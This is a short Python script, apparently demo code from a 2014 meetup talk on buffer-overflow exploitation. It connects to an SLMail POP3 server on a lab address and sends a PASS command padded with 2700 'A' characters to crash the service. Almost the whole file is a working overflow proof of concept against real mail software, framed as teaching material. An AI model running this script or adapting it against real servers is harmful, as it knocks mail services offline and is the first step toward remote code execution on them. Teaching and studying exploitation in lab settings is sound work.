#!/usr/bin/python
# kassel codemeetup 10.09.2014 - buffer overflow exploiting talk 
# just sending a lot of 'A's to crash the SLMail Server

import socket

# AF_INET = IPv4, SOCK_STREAM = TCP, SOCK_DGREAM = UDP
# See http://openbook.galileocomputing.de/python/python_kapitel_20_001.htm
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

buffer = 'A' * 2700

# exception handler
try:
	print '\nSending buffer...'
	s.connect(('10.0.0.20',110))
	data=s.recv(1024)
	s.send('User test' + '\r\n')
	data=s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print '\n Done!'
except:
	print 'Could not connect to POP3!'
